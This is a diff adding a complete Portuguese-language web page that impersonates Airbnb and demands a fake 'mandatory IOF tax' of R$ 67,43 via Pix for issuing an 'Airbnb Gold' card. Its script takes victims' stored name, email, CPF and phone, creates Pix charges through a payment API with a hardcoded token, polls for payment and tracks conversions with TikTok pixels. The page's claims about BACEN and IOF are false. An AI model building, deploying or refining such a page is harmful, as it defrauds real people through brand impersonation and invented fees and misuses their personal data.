@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Taxa de IOF — Emissão de Cartão Físico</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--gray:#6A6A6A;--gray-light:#DDDDDD;--bg:#F7F7F7;--white:#FFFFFF;--green:#34C759;--pix:#32BCAD;--warn:#FF9F0A;--blue:#007AFF;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--bg);color:var(--black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--white)}
+
+        /* NAV */
+        .nav{display:flex;align-items:center;padding:13px 20px;border-bottom:1px solid var(--gray-light);background:rgba(255,255,255,.96);backdrop-filter:blur(10px);position:sticky;top:0;z-index:100}
+        .nav-title{flex:1;text-align:center;font-size:.9rem;font-weight:700}
+        .nav-sec{display:flex;align-items:center;gap:4px;font-size:.68rem;color:var(--green);font-weight:600}
+        .nav-sec i{font-size:11px}
+
+        .progress{height:3px;background:var(--gray-light)}
+        .prog-bar{height:100%;background:var(--green);border-radius:2px;width:100%}
+
+        .content{padding:20px}
+
+        /* STEP BADGE */
+        .step-badge{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(0,122,255,.06);border:1px solid rgba(0,122,255,.14);border-radius:14px;margin-bottom:18px}
+        .sb-icon{width:36px;height:36px;border-radius:10px;background:rgba(0,122,255,.12);display:flex;align-items:center;justify-content:center;font-size:16px;color:var(--blue);flex-shrink:0}
+        .sb-info{flex:1}
+        .sb-title{font-size:.8rem;font-weight:700;color:var(--blue)}
+        .sb-desc{font-size:.68rem;color:var(--gray)}
+
+        /* IOF CARD */
+        .iof-card{border-radius:18px;overflow:hidden;margin-bottom:18px;border:1px solid var(--gray-light)}
+        .iof-header{background:linear-gradient(135deg,#1A1A1A 0%,#2d2d2d 100%);padding:18px;color:#fff;display:flex;align-items:center;gap:14px}
+        .iof-icon{width:48px;height:48px;border-radius:12px;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .iof-icon svg{height:24px;fill:#fff}
+        .iof-name{font-size:1rem;font-weight:800;letter-spacing:-.01em}
+        .iof-sub{font-size:.72rem;color:rgba(255,255,255,.6);margin-top:2px}
+        .iof-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;background:rgba(255,56,92,.2);border:1px solid rgba(255,56,92,.3);border-radius:20px;font-size:.65rem;font-weight:700;color:var(--red);margin-top:6px}
+        .iof-body{padding:16px;background:var(--bg)}
+        .iof-row{display:flex;justify-content:space-between;padding:7px 0;font-size:.82rem;border-bottom:1px solid var(--gray-light)}
+        .iof-row:last-child{border:none;padding-top:10px;margin-top:2px}
+        .iof-row .lbl{color:var(--gray)}
+        .iof-row .val{font-weight:700}
+        .iof-total{display:flex;justify-content:space-between;font-size:1.05rem;font-weight:800;padding:12px 16px;background:var(--white);border-top:2px solid var(--gray-light)}
+        .iof-total .amount{color:var(--red)}
+
+        /* INFO BOX */
+        .info-box{background:rgba(0,122,255,.04);border:1px solid rgba(0,122,255,.12);border-radius:14px;padding:14px 16px;margin-bottom:18px;font-size:.78rem;color:#0055B3;line-height:1.7}
+        .info-box strong{font-weight:700}
+
+        /* PIX METHOD */
+        .pix-method{display:flex;align-items:center;gap:12px;padding:14px;border:2px solid var(--pix);border-radius:14px;background:rgba(50,188,173,.04);margin-bottom:16px;position:relative}
+        .pix-method::after{content:'';position:absolute;top:12px;right:14px;width:20px;height:20px;border-radius:50%;background:var(--pix) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E") center/12px no-repeat}
+        .pm-icon{width:40px;height:40px;border-radius:10px;background:var(--pix);display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;flex-shrink:0}
+        .pm-title{font-size:.92rem;font-weight:700}
+        .pm-desc{font-size:.72rem;color:var(--gray)}
+        .pm-badge{display:inline-block;padding:2px 8px;background:rgba(50,188,173,.12);color:var(--pix);font-size:.67rem;font-weight:700;border-radius:6px;margin-top:3px}
+
+        /* PAY BUTTON */
+        .pay-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:17px;border:none;border-radius:14px;font-size:.98rem;font-weight:700;cursor:pointer;font-family:var(--font);background:var(--black);color:#fff;transition:.25s;margin-bottom:14px;position:relative;overflow:hidden}
+        .pay-btn:hover{opacity:.9}
+        .pay-btn:active{transform:scale(.98)}
+        .pay-btn:disabled{opacity:.5;cursor:not-allowed}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:22px;height:22px;margin:-11px 0 0 -11px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
+        .pay-btn.loading .pay-label{opacity:0}
+        @keyframes spin{to{transform:rotate(360deg)}}
+
+        /* REQUIRED NOTICE */
+        .required-notice{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(255,59,48,.06);border:1px solid rgba(255,59,48,.12);border-radius:10px;margin-bottom:16px;font-size:.73rem;color:#CC2A00}
+        .required-notice i{color:#FF3B30;flex-shrink:0}
+
+        /* GUARANTEES */
+        .guarantees{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:18px}
+        .guar{text-align:center;padding:12px 6px;background:var(--bg);border-radius:12px}
+        .guar i{font-size:20px;color:var(--gray);margin-bottom:4px;display:block}
+        .guar span{font-size:.6rem;color:var(--gray);font-weight:600;line-height:1.4;display:block}
+
+        /* PIX OVERLAY */
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:.3s;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.open{opacity:1;visibility:visible}
+        .pix-modal{background:var(--white);border-radius:22px 22px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,.72,0,1)}
+        .pix-overlay.open .pix-modal{transform:translateY(0)}
+        .pix-handle{width:36px;height:4px;background:var(--gray-light);border-radius:2px;margin:10px auto 0}
+        .pix-mhead{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--gray-light)}
+        .pix-mhead h3{font-size:.98rem;font-weight:800}
+        .pix-close{width:28px;height:28px;border-radius:50%;background:var(--bg);border:none;cursor:pointer;font-size:13px;color:var(--gray)}
+        .pix-mbody{padding:20px}
+        .pix-timer{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(255,149,10,.08);border-radius:10px;margin-bottom:18px;font-size:.8rem}
+        .pix-timer i{color:var(--warn);flex-shrink:0}
+        .pix-timer .ptxt{flex:1;color:var(--gray)}
+        .pix-timer .ptime{font-weight:800;color:var(--warn);font-variant-numeric:tabular-nums}
+        .qr-wrap{display:flex;flex-direction:column;align-items:center;margin-bottom:18px}
+        .qr-box{position:relative;width:210px;height:210px;padding:12px;background:#fff;border-radius:16px;border:2px solid var(--gray-light);margin-bottom:10px}
+        .qr-box img{width:100%;height:100%;object-fit:contain;border-radius:8px}
+        .qr-overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:42px;height:42px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .qr-overlay svg{height:24px;fill:var(--red)}
+        .qr-lbl{font-size:.72rem;color:var(--gray)}
+        .copy-sec{margin-bottom:18px}
+        .copy-sec label{display:block;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray);margin-bottom:7px}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:11px 12px;background:var(--bg);border:1.5px solid var(--gray-light);border-radius:10px;font-family:monospace;font-size:.68rem;color:var(--black);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none}
+        .copy-btn{padding:11px 18px;background:var(--black);color:#fff;border:none;border-radius:10px;font-size:.8rem;font-weight:700;cursor:pointer;font-family:var(--font);white-space:nowrap;transition:.2s}
+        .copy-btn:active{transform:scale(.96)}
+        .copy-btn.done{background:var(--green)}
+        .pix-steps{margin-bottom:18px;padding:14px;background:var(--bg);border-radius:14px}
+        .ps-title{font-size:.8rem;font-weight:700;margin-bottom:10px}
+        .ps-item{display:flex;gap:10px;margin-bottom:8px;font-size:.78rem;color:var(--gray);line-height:1.5}
+        .ps-num{width:22px;height:22px;border-radius:50%;background:var(--black);color:#fff;font-size:.67rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:14px;background:rgba(255,149,10,.06);border-radius:14px;margin-bottom:14px;transition:.4s}
+        .pix-status.paid{background:rgba(52,199,89,.06)}
+        .ps-icon{width:46px;height:46px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-size:20px}
+        .ps-icon.wait{background:rgba(255,149,10,.12);color:var(--warn)}
+        .ps-icon.paid{background:rgba(52,199,89,.12);color:var(--green)}
+        .ps-title2{font-size:.9rem;font-weight:800;margin-bottom:2px}
+        .ps-desc{font-size:.73rem;color:var(--gray)}
+        .pulse-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle;animation:dp 1.5s ease infinite}
+        .pulse-dot.wait{background:var(--warn)}
+        .pulse-dot.paid{background:var(--green)}
+        @keyframes dp{0%,100%{opacity:1}50%{opacity:.3}}
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="nav">
+        <div style="width:32px"></div>
+        <div class="nav-title">Taxa de IOF — Cartão Físico</div>
+        <div class="nav-sec"><i class="fas fa-lock"></i> Seguro</div>
+    </div>
+    <div class="progress"><div class="prog-bar"></div></div>
+
+    <div class="content">
+        <!-- STEP BADGE -->
+        <div class="step-badge">
+            <div class="sb-icon"><i class="fas fa-credit-card"></i></div>
+            <div class="sb-info">
+                <div class="sb-title">Etapa final: Emissão do cartão físico</div>
+                <div class="sb-desc">Pagamento de frete confirmado · Pague a taxa obrigatória de IOF</div>
+            </div>
+        </div>
+
+        <!-- IOF CARD -->
+        <div class="iof-card">
+            <div class="iof-header">
+                <div class="iof-icon">
+                    <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 510.419 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+                </div>
+                <div>
+                    <div class="iof-name">Cartão Airbnb Gold</div>
+                    <div class="iof-sub">Cartão físico · Visa Internacional</div>
+                    <div class="iof-badge"><i class="fas fa-file-invoice-dollar"></i> IOF Obrigatório</div>
+                </div>
+            </div>
+            <div class="iof-body">
+                <div class="iof-row"><span class="lbl">Frete</span><span class="val" style="color:var(--green)"><i class="fas fa-check-circle" style="font-size:10px;margin-right:3px"></i>Pago</span></div>
+                <div class="iof-row"><span class="lbl">Taxa de IOF (emissão física)</span><span class="val" id="iofVal">R$ 67,43</span></div>
+                <div class="iof-row"><span class="lbl">Base de cálculo</span><span class="val">Regulamento BACEN</span></div>
+            </div>
+            <div class="iof-total">
+                <span>Total a pagar agora</span>
+                <span class="amount" id="totalIof">R$ 67,43</span>
+            </div>
+        </div>
+
+        <!-- INFO BOX -->
+        <div class="info-box">
+            <strong>O que é a Taxa de IOF?</strong><br>
+            O Imposto sobre Operações Financeiras (IOF) é um tributo federal obrigatório cobrado na emissão de cartões físicos com bandeira internacional, conforme regulamentação do Banco Central do Brasil. O valor é calculado sobre o limite disponível do cartão.
+        </div>
+
+        <!-- PIX METHOD -->
+        <div class="pix-method">
+            <div class="pm-icon"><i class="fas fa-bolt"></i></div>
+            <div>
+                <div class="pm-title">Pagar com Pix</div>
+                <div class="pm-desc">Aprovação instantânea</div>
+                <div class="pm-badge">Pagamento único obrigatório</div>
+            </div>
+        </div>
+
+        <!-- REQUIRED NOTICE -->
+        <div class="required-notice">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>Este pagamento é <strong>obrigatório e validado</strong> para a emissão do cartão físico. Sem ele, o cartão não poderá ser enviado.</span>
+        </div>
+
+        <!-- PAY BUTTON -->
+        <button class="pay-btn" id="payBtn" onclick="generatePix()">
+            <span class="pay-label"><i class="fas fa-bolt"></i> Pagar taxa de IOF — <span id="payPrice">R$ 67,43</span></span>
+        </button>
+
+        <!-- GUARANTEES -->
+        <div class="guarantees">
+            <div class="guar"><i class="fas fa-shield-alt"></i><span>Pagamento 100% seguro</span></div>
+            <div class="guar"><i class="fas fa-university"></i><span>Regulado pelo BACEN</span></div>
+            <div class="guar"><i class="fas fa-truck"></i><span>Cartão físico</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- PIX MODAL -->
+<div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+        <div class="pix-handle"></div>
+        <div class="pix-mhead">
+            <h3>Pagar Taxa de IOF com Pix</h3>
+            <button class="pix-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="pix-mbody">
+            <div class="pix-timer">
+                <i class="fas fa-clock"></i>
+                <span class="ptxt">Código expira em</span>
+                <span class="ptime" id="pixTimer">09:59</span>
+            </div>
+            <div class="qr-wrap">
+                <div class="qr-box">
+                    <div id="qrcode"></div>
+                    <div class="qr-overlay">
+                        <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 510.419 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+                    </div>
+                </div>
+                <div class="qr-lbl">Escaneie o QR Code com seu banco</div>
+            </div>
+            <div class="copy-sec">
+                <label>Ou copie o código Pix</label>
+                <div class="copy-box">
+                    <input type="text" class="copy-input" id="pixCodeInput" readonly>
+                    <button class="copy-btn" id="copyBtn" onclick="copyPix()">Copiar</button>
+                </div>
+            </div>
+            <div class="pix-steps">
+                <div class="ps-title">Como pagar:</div>
+                <div class="ps-item"><div class="ps-num">1</div><span>Abra o app do seu banco e acesse a área Pix</span></div>
+                <div class="ps-item"><div class="ps-num">2</div><span>Escolha "Pix copia e cola" ou escaneie o QR Code</span></div>
+                <div class="ps-item"><div class="ps-num">3</div><span>Confirme os dados e finalize o pagamento</span></div>
+                <div class="ps-item"><div class="ps-num">4</div><span>Aguarde a confirmação automática nesta tela</span></div>
+            </div>
+            <div class="pix-status" id="pixStatus">
+                <div class="ps-icon wait"><i class="fas fa-clock"></i></div>
+                <div class="ps-title2"><span class="pulse-dot wait"></span>Aguardando pagamento...</div>
+                <div class="ps-desc">O status atualiza automaticamente</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
+    function buildUrl(base,extra={}){const url=new URL(base,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v)});return url.toString();}
+
+    // ========== CONFIGURAÇÃO IOF ==========
+    const SHARK_TOKEN = 'bF8BUqBQfsai95VXrjQfmzuHjJxeLtuC89XU7NLRPAT5Wrc3mIHnc0Rzud84';
+    const IOF_PRODUCT_HASH = 'vvae7ptemd'; // usar mesmo produto ou substituir por hash específico de IOF
+    const IOF_AMOUNT_CENTS = 6743; // R$ 67,43 em centavos — alterar conforme necessário
+    const IOF_AMOUNT_DISPLAY = 'R$ 67,43';
+
+    let verifyInterval = null;
+    let pixTimerInterval = null;
+    let pixSecs = 9*60+59;
+
+    function parseAmount(cents){ return cents; }
+
+    async function generatePix(){
+        const btn = document.getElementById('payBtn');
+        if(btn.classList.contains('loading')) return;
+        btn.classList.add('loading'); btn.disabled = true;
+        // ===== PIXEL: AddToCart (IOF iniciado) =====
+        try {
+            if(window.ttq) {
+                ttq.track('AddToCart', {
+                    content_type: 'product',
+                    content_id: 'taxa-iof',
+                    content_name: 'Taxa IOF — Emissão Cartão Airbnb',
+                    currency: 'BRL',
+                    value: 67.43
+                });
+            }
+        } catch(pe){ console.warn('Pixel error:', pe); }
+        // ===========================================
+
+        const ld = LeadData.load();
+        const payload = {
+            amount: IOF_AMOUNT_CENTS,
+            offer_hash: IOF_PRODUCT_HASH,
+            payment_method: 'pix',
+            customer: {
+                name: ld.nome || 'Cliente Airbnb',
+                email: ld.email || 'cliente@airbnb.com',
+                document: ld.cpf || '00000000000',
+                phone_number: ld.phone || ld.phone_formatted?.replace(/\D/g,'') || '11999999999'
+            },
+            cart: [{
+                product_hash: IOF_PRODUCT_HASH,
+                title: 'Taxa de IOF — Emissão Cartão Físico Airbnb',
+                price: IOF_AMOUNT_CENTS,
+                quantity: 1,
+                operation_type: 1,
+                tangible: false
+            }]
+        };
+
+        try{
+            const resp = await fetch(`https://api.sharkpayments.com.br/api/public/v1/transactions?api_token=${SHARK_TOKEN}`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify(payload)
+            });
+            const result = await resp.json();
+            const d = result.data || result;
+            if(d.hash || d.pix){
+                const transactionHash = d.hash || d.id;
+                const pixCode = d.pix?.pix_qr_code || d.pix_code;
+                const qrBase64 = d.pix?.qr_code_base64;
+                if(pixCode){
+                    document.getElementById('pixCodeInput').value = pixCode;
+                    const qrContainer = document.getElementById('qrcode');
+                    if(qrBase64){
+                        qrContainer.innerHTML = `<img src="data:image/png;base64,${qrBase64}" style="width:100%;height:100%;object-fit:contain;border-radius:8px">`;
+                    } else {
+                        QRCode.toDataURL(pixCode, {width:186,margin:1}, (err,url)=>{
+                            if(!err) qrContainer.innerHTML = `<img src="${url}" style="width:100%;height:100%;object-fit:contain;border-radius:8px">`;
+                        });
+                    }
+                    openModal();
+                    startVerify(transactionHash);
+                    startPixTimer();
+                    btn.innerHTML = '<span class="pay-label"><i class="fas fa-check"></i> Pix gerado — aguardando pagamento</span>';
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                } else {
+                    throw new Error('Código Pix não retornado');
+                }
+            } else {
+                throw new Error('Falha na geração do Pix');
+            }
+        } catch(e){
+            console.error(e);
+            btn.classList.remove('loading');
+            btn.disabled = false;
+            btn.innerHTML = '<span class="pay-label"><i class="fas fa-bolt"></i> Gerar Pix novamente</span>';
+            alert('Erro ao gerar Pix. Por favor, tente novamente.');
+        }
+    }
+
+    function startVerify(hash){
+        if(verifyInterval) clearInterval(verifyInterval);
+        verifyInterval = setInterval(async()=>{
+            try{
+                const resp = await fetch(`https://api.sharkpayments.com.br/api/public/v1/transactions/${hash}?api_token=${SHARK_TOKEN}`);
+                const r = await resp.json();
+                const status = (r.data||r).payment_status;
+                if(status === 'paid' || status === 'approved'){
+                    clearInterval(verifyInterval);
+                    if(pixTimerInterval) clearInterval(pixTimerInterval);
+                    // ===== PIXEL: CompletePayment (IOF pago) =====
+                    try {
+                        if(window.ttq) {
+                            ttq.track('CompletePayment', {
+                                content_type: 'product',
+                                content_id: 'taxa-iof',
+                                content_name: 'Taxa IOF — Emissão Cartão Airbnb',
+                                currency: 'BRL',
+                                value: 67.43
+                            });
+                        }
+                    } catch(pe){ console.warn('Pixel error:', pe); }
+                    // =============================================
+                    LeadData.update({iof_pago: true, page: 'iof_confirmado'});
+                    const stDiv = document.getElementById('pixStatus');
+                    stDiv.className = 'pix-status paid';
+                    stDiv.innerHTML = '<div class="ps-icon paid"><i class="fas fa-check-circle"></i></div><div class="ps-title2"><span class="pulse-dot paid"></span>Taxa de IOF paga!</div><div class="ps-desc">Redirecionando para o seu dashboard...</div>';
+                    setTimeout(()=>{
+                        window.location.href = buildUrl('dashboard.html');
+                    }, 2500);
+                }
+            } catch(e){}
+        }, 3000);
+    }
+
+    function startPixTimer(){
+        if(pixTimerInterval) clearInterval(pixTimerInterval);
+        pixSecs = 9*60+59;
+        const ptEl = document.getElementById('pixTimer');
+        ptEl.textContent = '09:59';
+        pixTimerInterval = setInterval(()=>{
+            if(pixSecs <= 0){ clearInterval(pixTimerInterval); ptEl.textContent = 'Expirado'; return; }
+            pixSecs--;
+            const m = Math.floor(pixSecs/60), s = pixSecs%60;
+            ptEl.textContent = m+':'+(s<10?'0':'')+s;
+        }, 1000);
+    }
+
+    function openModal(){ document.getElementById('pixOverlay').classList.add('open'); }
+    function closeModal(){ document.getElementById('pixOverlay').classList.remove('open'); }
+
+    function copyPix(){
+        const code = document.getElementById('pixCodeInput').value;
+        if(!code) return;
+        navigator.clipboard.writeText(code).then(()=>{
+            const btn = document.getElementById('copyBtn');
+            btn.textContent='Copiado!'; btn.classList.add('done');
+            setTimeout(()=>{ btn.textContent='Copiar'; btn.classList.remove('done'); }, 2500);
+        });
+    }
+
+    document.getElementById('pixOverlay').addEventListener('click',function(e){
+        if(e.target === this) closeModal();
+    });
+</script>
+</body>
+</html>
